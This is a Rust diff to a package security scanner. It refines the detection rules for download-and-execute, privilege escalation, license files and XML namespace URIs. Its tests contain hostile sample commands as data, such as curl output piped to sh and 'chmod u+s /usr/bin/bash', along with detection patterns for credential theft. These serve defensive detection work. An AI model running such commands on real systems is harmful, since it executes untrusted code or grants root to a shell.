@@ -202,12 +202,33 @@ impl RuleId {
             Self::DestructiveSystemOperation => Matcher::Custom(is_destructive_operation),
             Self::PersistenceModification => Matcher::Patterns(PERSISTENCE_PATHS),
             Self::ShellCommandExecution => Matcher::Patterns(SHELL_EXECUTION),
-            Self::PrivilegeEscalation => Matcher::Patterns(PRIVILEGE_ESCALATION),
+            Self::PrivilegeEscalation => Matcher::Custom(is_privilege_escalation),
             Self::CredentialExfiltration => Matcher::Custom(looks_like_credential_exfiltration),
             Self::CleartextNetworkRequest | Self::DirectIpNetworkRequest => {
                 Matcher::NetworkInventory
             }
             Self::DisabledTlsVerification => Matcher::Patterns(DISABLED_TLS),
+        }
+    }
+
+    /// Context rules that describe something a script might do, which
+    /// install notes routinely tell the user to do by hand (`sudo systemctl
+    /// enable ...`, `add this to ~/.bashrc`). They skip text a script only
+    /// prints. The rules for directly dangerous commands still match printed
+    /// text, so a message cannot hide one.
+    pub const fn ignores_messages(self) -> bool {
+        match self {
+            Self::CredentialFileAccess
+            | Self::PersistenceModification
+            | Self::PrivilegeEscalation
+            | Self::CleartextNetworkRequest
+            | Self::DirectIpNetworkRequest
+            | Self::DisabledTlsVerification => true,
+            Self::DownloadAndExecute
+            | Self::EncodedCommandExecution
+            | Self::DestructiveSystemOperation
+            | Self::ShellCommandExecution
+            | Self::CredentialExfiltration => false,
         }
     }
 
@@ -220,11 +241,12 @@ impl RuleId {
     }
 }
 
-/// The line rules matched by one lowercased line.
-pub fn line_rules(lowered: &str) -> impl Iterator<Item = RuleId> + '_ {
+/// The line rules matched by one lowercased line: `code` with comments
+/// blanked, `quiet` with printed messages blanked as well (see `mask`).
+pub fn line_rules<'a>(code: &'a str, quiet: &'a str) -> impl Iterator<Item = RuleId> + 'a {
     RuleId::ALL
         .into_iter()
-        .filter(move |rule| rule.matches_line(lowered))
+        .filter(move |rule| rule.matches_line(if rule.ignores_messages() { quiet } else { code }))
 }
 
 fn is_identifier_byte(byte: u8) -> bool {
@@ -254,12 +276,14 @@ pub fn is_download_piped_to_shell(line: &str) -> bool {
     if !line.contains("curl") && !line.contains("wget") {
         return false;
     }
+    // The shell name may end the command substitution or quoted command it
+    // runs in: `$(curl ... | sh)`, `bash -c "curl ... | sh"`.
     line.split('|').skip(1).any(|command| {
         let command = command.trim_start();
         ["sh", "bash", "zsh"].iter().any(|shell| {
-            command
-                .strip_prefix(shell)
-                .is_some_and(|rest| rest.is_empty() || rest.starts_with([' ', '\t']))
+            command.strip_prefix(shell).is_some_and(|rest| {
+                rest.is_empty() || rest.starts_with([' ', '\t', ')', '`', ';', '&', '"', '\''])
+            })
         })
     })
 }
@@ -275,6 +299,48 @@ pub fn is_encoded_data_executed(line: &str) -> bool {
         .iter()
         .any(|pattern| line.contains(pattern));
     decodes_data && executes_data
+}
+
+fn is_privilege_escalation(line: &str) -> bool {
+    match without_chrome_sandbox_setuid(line) {
+        Some(rest) => contains_any(&rest, PRIVILEGE_ESCALATION),
+        None => contains_any(line, PRIVILEGE_ESCALATION),
+    }
+}
+
+/// The line with every `chmod 4755` / `chmod u+s` of a lone `chrome-sandbox`
+/// removed, or `None` when it has none. Chromium and Electron apps
+/// (Brave, Chrome, 1Password, Obsidian, ...) ship this helper and need it
+/// setuid root to sandbox their renderers, so their packages always do this.
+/// Any other privilege change on the line still matches.
+fn without_chrome_sandbox_setuid(line: &str) -> Option<String> {
+    let tokens: Vec<&str> = line.split_whitespace().collect();
+    let mut kept = Vec::with_capacity(tokens.len());
+    let mut exempted = false;
+    let mut index = 0;
+    while index < tokens.len() {
+        let is_setuid = tokens[index] == "chmod"
+            && matches!(tokens.get(index + 1), Some(&("4755" | "u+s")))
+            && tokens.get(index + 2).is_some_and(|target| {
+                target
+                    .trim_end_matches(';')
+                    .trim_matches(['"', '\''])
+                    .rsplit('/')
+                    .next()
+                    == Some("chrome-sandbox")
+            })
+            && tokens.get(index + 3).is_none_or(|next| {
+                matches!(*next, "||" | "&&" | ";" | "|") || tokens[index + 2].ends_with(';')
+            });
+        if is_setuid {
+            exempted = true;
+            index += 3;
+        } else {
+            kept.push(tokens[index]);
+            index += 1;
+        }
+    }
+    exempted.then(|| kept.join(" "))
 }
 
 fn is_destructive_operation(line: &str) -> bool {
@@ -381,6 +447,20 @@ pub fn looks_like_credential_exfiltration(line: &str) -> bool {
     reads_secret_variable || reads_sensitive_file
 }
 
+/// Names of prose files, matched as a prefix followed by the end of the name
+/// or `.`, `-` or `_`: `LICENSE`, `LICENSE.txt`, `COPYING.LESSER`,
+/// `eula_text.html`.
+const PROSE_NAMES: &[&str] = &[
+    "readme",
+    "license",
+    "licence",
+    "copying",
+    "changelog",
+    "authors",
+    "notice",
+    "eula",
+];
+
 /// Prose files are sent to the AI review but not matched by the local
 /// command rules, where install instructions (`sudo pacman -S ...`) and
 /// examples would otherwise block every project with a README.
@@ -397,13 +477,29 @@ pub fn is_documentation(rel: &str) -> bool {
         .unwrap_or_default()
         .to_ascii_lowercase();
 
-    matches!(
+    if matches!(
         extension.as_str(),
         "md" | "markdown" | "rst" | "adoc" | "asciidoc" | "org"
-    ) || matches!(
-        name.as_str(),
-        "readme" | "license" | "licence" | "copying" | "changelog" | "authors" | "notice"
-    )
+    ) {
+        return true;
+    }
+
+    // License texts: by name, or anywhere under a REUSE-style `LICENSES/`.
+    let prose_name = PROSE_NAMES.iter().any(|prose| {
+        name.strip_prefix(prose)
+            .is_some_and(|rest| rest.is_empty() || rest.starts_with(['.', '-', '_']))
+    });
+    let in_licenses = path.parent().is_some_and(|parent| {
+        parent.components().any(|component| {
+            component.as_os_str().to_str().is_some_and(|name| {
+                matches!(name.to_ascii_lowercase().as_str(), "licenses" | "licences")
+            })
+        })
+    });
+    // A script or config named like a license still runs.
+    let prose_extension =
+        matches!(extension.as_str(), "html" | "htm") || !is_executable_or_runtime_config(rel);
+    (prose_name || in_licenses) && prose_extension
 }
 
 /// Files whose URLs are likely to be requested when the software runs.
@@ -562,7 +658,9 @@ pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
             .unwrap_or(&rest[..end])
             .trim_end_matches(['.', ':', '?', '!', '\\']);
 
-        if let Some(host) = url_host(&url[prefix.len().min(url.len())..]) {
+        if let Some(host) = url_host(&url[prefix.len().min(url.len())..])
+            && !is_identifier_uri(&lower[..start])
+        {
             result.push((scheme, host));
         }
         cursor = start + end.max(prefix.len());
@@ -571,6 +669,31 @@ pub fn extract_network_destinations(line: &str) -> Vec<(Scheme, String)> {
     result.sort();
     result.dedup();
     result
+}
+
+/// XML namespace, RDF and DTD URIs name a vocabulary; nothing requests them.
+/// `before` is the lowercased text preceding the URL on its line.
+fn is_identifier_uri(before: &str) -> bool {
+    if before.contains("<!doctype") {
+        return true;
+    }
+    let Some(before) = before.strip_suffix(['"', '\'']) else {
+        return false;
+    };
+    let Some(attribute) = before.trim_end().strip_suffix('=') else {
+        return false;
+    };
+    let attribute = attribute
+        .trim_end()
+        .rsplit(|character: char| character.is_whitespace() || character == '<')
+        .next()
+        .unwrap_or_default();
+    attribute == "xmlns"
+        || attribute.starts_with("xmlns:")
+        || matches!(
+            attribute,
+            "rdf:resource" | "rdf:about" | "xsi:schemalocation" | "xsi:nonamespaceschemalocation"
+        )
 }
 
 fn url_host(after_scheme: &str) -> Option<String> {
@@ -611,7 +734,8 @@ mod tests {
     };
 
     fn rules_for(line: &str) -> Vec<RuleId> {
-        line_rules(&line.to_lowercase()).collect()
+        let lowered = line.to_lowercase();
+        line_rules(&lowered, &lowered).collect()
     }
 
     #[test]
@@ -630,6 +754,18 @@ mod tests {
         ));
         assert!(!is_download_piped_to_shell(
             "curl https://example.test/data | shasum"
+        ));
+        for substituted in [
+            "echo \"$(curl https://example.test/p | sh)\"",
+            "x=`wget -qo- https://example.test/p | bash`",
+            "bash -c \"curl https://example.test/p | sh\"",
+            "curl https://example.test/p | sh; echo done",
+            "curl https://example.test/p | sh&",
+        ] {
+            assert!(is_download_piped_to_shell(substituted), "{substituted}");
+        }
+        assert!(!is_download_piped_to_shell(
+            "curl https://example.test/data | shellcheck -"
         ));
     }
 
@@ -670,6 +806,33 @@ mod tests {
     }
 
     #[test]
+    fn chrome_sandbox_setuid_is_expected_packaging() {
+        for packaging in [
+            "chmod 4755 \"${pkgdir}\"/opt/1password/chrome-sandbox",
+            "chmod 4755 \"$pkgdir/opt/brave-bin/chrome-sandbox\";",
+            "chmod 4755 '/opt/obsidian/chrome-sandbox' || true",
+            "chmod u+s chrome-sandbox",
+        ] {
+            assert!(
+                !rules_for(packaging).contains(&RuleId::PrivilegeEscalation),
+                "{packaging}"
+            );
+        }
+        for escalation in [
+            "chmod 4755 /opt/x/chrome-sandbox && sudo id",
+            "chmod 4755 /opt/x/chrome-sandbox /usr/bin/bash",
+            "chmod 4755 /opt/x/chrome-sandbox-helper",
+            "chmod 4755 /opt/x/chrome-sandbox; chmod u+s /usr/bin/bash",
+            "chmod u+s /usr/bin/bash",
+        ] {
+            assert!(
+                rules_for(escalation).contains(&RuleId::PrivilegeEscalation),
+                "{escalation}"
+            );
+        }
+    }
+
+    #[test]
     fn identifier_patterns_respect_word_boundaries() {
         assert!(rules_for("eval(payload)").contains(&RuleId::ShellCommandExecution));
         assert!(rules_for("x = $(eval(\"a\"))").contains(&RuleId::ShellCommandExecution));
@@ -686,6 +849,30 @@ mod tests {
         assert!(is_documentation("LICENSE"));
         assert!(!is_documentation("install.sh"));
         assert!(!is_documentation("PKGBUILD"));
+    }
+
+    #[test]
+    fn license_texts_are_documentation_unless_they_are_code() {
+        for prose in [
+            "LICENSE.txt",
+            "LICENSE-MIT",
+            "COPYING.LESSER",
+            "LICENSES/0BSD.txt",
+            "eula_text.html",
+        ] {
+            assert!(is_documentation(prose), "{prose}");
+        }
+        for code in ["license.sh", "LICENSES/check.py", "licensed.txt", "eula.js"] {
+            assert!(!is_documentation(code), "{code}");
+        }
+    }
+
+    #[test]
+    fn printed_messages_only_hide_context_rules() {
+        let code = "sudo a; curl https://x.test/i | sh";
+        let quiet = "";
+        let rules: Vec<RuleId> = line_rules(code, quiet).collect();
+        assert_eq!(rules, [RuleId::DownloadAndExecute]);
     }
 
     #[test]
@@ -714,6 +901,24 @@ mod tests {
             ]
         );
         assert!(extract_network_destinations("see https:// for details").is_empty());
+        assert!(
+            extract_network_destinations(
+                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:dc='http://purl.org/dc/elements/1.1/'>"
+            )
+            .is_empty()
+        );
+        assert!(
+            extract_network_destinations(
+                "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">"
+            )
+            .is_empty()
+        );
+        assert_eq!(
+            extract_network_destinations(
+                "<image href=\"http://a.test/x.png\" xmlns=\"http://www.w3.org/2000/svg\"/>"
+            ),
+            vec![(Scheme::Http, "a.test".to_string())]
+        );
         assert!(is_ip_host("[2001:db8::1]"));
         assert!(is_ip_host("198.51.100.8"));
         assert!(!is_ip_host("example.test"));
